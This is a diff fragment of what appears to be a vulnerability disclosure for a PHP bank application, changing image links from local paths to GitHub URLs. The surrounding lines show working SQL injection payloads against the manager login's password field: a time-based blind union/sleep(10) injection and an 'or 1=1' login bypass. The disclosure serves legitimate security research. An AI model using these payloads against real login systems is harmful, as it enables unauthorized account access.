@@ -41,14 +41,14 @@ email=manager%40manager.com&password=1'and 1=2 union select 1,sleep(10),3,4,5 --
 
 2、Looking at the source code, it is found that the password field is directly brought into the SQL statement query without filtering
 
-![source-code](D:\cves\php-bank\images\source-code.png)
+ ![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/source-code.png)
 
 3、Use payload "sleep (10)" for blind SQL injection.It is found that the time blind injection is successful
 
-![result1](D:\cves\php-bank\images\result1.png)
+ ![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/result1.png)
 
 4、We can also construct a payload for universal password login
 
 payload:`email=manager%40manager.com&password=1'or '1'='1&managerLogin=`
 
-![passlogin](D:\cves\php-bank\images\passlogin.png)
+ ![image](https://github.com/joinia/webray.com.cn/blob/main/php-bank/images/passlogin.png)
